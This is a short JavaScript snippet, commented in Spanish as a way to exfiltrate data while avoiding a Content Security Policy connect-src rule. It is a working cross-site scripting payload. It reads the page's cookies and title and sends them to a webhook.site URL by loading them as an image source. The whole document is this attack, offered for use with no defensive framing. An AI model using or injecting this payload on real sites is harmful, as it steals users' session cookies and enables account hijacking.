// Usar Image() para exfiltrar - no usa connect-src
var data = encodeURIComponent(document.cookie + '|||' + document.title);
var img = new Image();
img.src = 'https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?c=' + data;
document.body.appendChild(img);